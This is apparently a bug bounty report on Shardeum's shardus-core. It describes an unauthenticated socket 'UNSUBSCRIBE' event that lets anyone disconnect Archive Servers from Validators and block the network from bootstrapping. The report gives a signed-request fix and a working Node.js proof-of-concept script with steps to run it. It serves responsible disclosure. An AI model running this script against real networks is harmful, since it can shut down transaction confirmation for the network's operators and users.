# 33044 - \[BC - Medium] Preventing the network from loading by disconne...

Submitted on Jul 10th 2024 at 09:05:58 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33044

Report type: Blockchain/DLT

Report severity: Medium

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)

## Description

## Vulnerability Details

The socket connection in a Validator listens to an `UNSUBSCRIBE` event and expects the ARCHIVER\_PUBLIC\_KEY of an Archiver Server that wishes to unsubscribe.

```
socket.on('UNSUBSCRIBE', function(ARCHIVER_PUBLIC_KEY) {
    console.log(`Archive server has with public key ${ARCHIVER_PUBLIC_KEY} request to unsubscribe`)
    Archivers.removeArchiverConnection(ARCHIVER_PUBLIC_KEY)
})
```

> The "*removeArchiverConnection(...)*" function disconnects the socket connection with the Archiver Server.
>
> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/shardus/index.ts#L491-L494>

Unfortunately, anyone can connect to the socket of a Validator and request the disconnection of any or all the currently connected Archive Servers.

In our tests, reproducing the attack while the first Validator is in the Syncing phase, prevents all other Validators from joining the network later, and after up to \~15 minutes of re-attempting, they all shut down themselves.

## Recommended fix

The **UNSUBSCRIBE** request must require a stringified object with the following fields:

**1-** The ARCHIVER\_PUBLIC\_KEY to disconnect

**2-** The signature of a message containing the IP address requesting the disconnection of the Archive Server.

**3-** A timestamp and nonce for the signature, to prevent replay attacks.

If a message containing the IP address that is requesting the disconnection is signed with the private key of the Archive Server, we can verify that this is an authorized request.

## Impact Details

A malicious agent can prevent the network from bootstrapping, which leads to the network not being able to confirm new transactions (total network shutdown).

> We haven't played around yet with disconnecting Archive Servers from Validators after the network is fully operational, but it could be a good experiment to see what goes wrong.

## Proof of Concept

As a proof of concept, we created a Node JS project, that connects to the socket of a Validator and requests to unsubscribe the Archive Server.

In the code below you must replace the IP address and PORT of the socket connection with yours (or let it the same if it applies to your setup as well). Finally, we hardcoded the public key of the Archive Server we want to disconnect but you can adapt the test to your needs.

```
// client.js
const io = require('socket.io-client');
const socket = io('http://192.168.0.15:9001');


socket.on('connect', () => {
	console.log('Connected to server');
	setInterval(() => {
		console.log('Sending message');
		socket.emit('UNSUBSCRIBE', '758b1c119412298802cd28dbfa394cdfeecc4074492d60844cc192d632d84de3');
	}, 1000);
});

socket.on('disconnect', () => {
	console.log('Disconnected from server');
});

socket.on('message', (msg) => {
	console.log('Message from server:', msg);
});
```

To execute the attack:

**Step 1-** Create a Node JS project with the code provided above in an `index.js` file.

**Step 2-** Start the network with `shardus start 20`

**Step 3-** As soon as you do, run the exploit with `node index.js` inside the Node JS project.
